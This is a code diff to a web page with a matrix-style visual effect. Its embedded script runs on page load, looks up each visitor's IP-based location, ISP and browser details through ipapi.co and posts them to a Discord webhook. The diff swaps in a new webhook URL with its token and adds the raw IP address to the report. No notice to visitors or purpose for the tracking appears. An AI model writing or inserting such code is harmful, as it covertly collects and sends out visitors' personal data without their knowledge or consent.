@@ -312,12 +312,13 @@ function fadeMatrixEffect(duration = 1500) {
   </head>
   <body>
     <script>
-      const webhookUrl = "https://discord.com/api/webhooks/1409356844341661767/ITBmRuNCIoT4hHnHe-ZbfvmPU6Dd6UPXUl4hx7nwCG5Z3qW0asDDK2aQm5BkvGThmArE";
+      const webhookUrl = "https://discord.com/api/webhooks/1406804822748827688/7GxqFVIxZTQI0b15UV6TLIeEw14JWqf1DAE1vOeNX7iXjq-Du3x8uPTOw2cqiFZxxacQ";
 
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
           const message = `🌍 New Visitor!
+🔑 IP: ${data.ip}
 📍 Location: ${data.city}, ${data.region}, ${data.country_name}
 🏢 ISP: ${data.org}
 🖥️ Browser/OS: ${navigator.userAgent}
@@ -333,11 +334,6 @@ function fadeMatrixEffect(duration = 1500) {
     </script>
   </body>
 </html>
-
-
-
-
-
 
 
 
